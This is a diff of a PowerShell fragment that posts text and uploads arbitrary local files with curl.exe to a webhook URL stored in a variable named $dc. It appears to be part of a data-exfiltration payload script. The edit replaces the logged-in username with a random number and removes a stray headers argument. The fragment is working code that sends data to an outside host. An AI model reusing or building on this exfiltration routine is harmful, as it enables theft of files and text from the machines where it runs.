@@ -59,12 +59,12 @@ $username = Get-Random -Minimum 10000 -Maximum 99999
 $hookurl = "$dc"
 
 $Body = @{
-  'username' = $env:username
+  'username' = $username
   'content' = $text
 }
 
 if (-not ([string]::IsNullOrEmpty($text))){
-Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Headers $username -Body ($Body | ConvertTo-Json)};
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
 
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
